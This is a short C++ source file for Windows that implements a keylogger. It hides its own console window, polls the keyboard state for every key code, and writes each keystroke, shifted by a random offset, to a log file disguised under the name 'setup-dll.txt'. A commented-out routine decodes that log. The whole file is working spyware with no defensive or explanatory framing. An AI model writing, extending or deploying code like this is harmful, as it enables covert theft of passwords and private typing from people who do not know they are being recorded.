#include <iostream>
#include <fstream>
//#include <cstdlib>
#include <ctime>
#include <conio.h>
#include <streambuf>
#include <Windows.h>

using namespace std;
fstream ifile;
void Stealth()
{
	HWND Stealth;
	AllocConsole();
	Stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(Stealth, 0);
}


void encrypt_file() {

	int decrypt;
	ifile.open("setup-dll.txt");
	ifile >> decrypt;
	char temp;

	for (; !ifile.eof();) {
		temp = ifile.get();
		temp = temp - decrypt;
		cout << temp;
	}
}
int main() {

	Stealth();
	srand(time(0));
	int encrypt = rand() % 26;
	if (encrypt == 0) {
		encrypt = 23;
	}

	ifile.open("setup-dll.txt", std::ofstream::out | std::ofstream::in| std::fstream::trunc);
	ifile << encrypt;
	ifile << " ";

	int itr = 0;
	
	while (1) {
		for (int i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {

				if (char(i) == '1') {
					ifile.close();
					return 0;
				}
				i += encrypt;
				ifile << char(i);
			}
		}
	}
	//encrypt_file();
}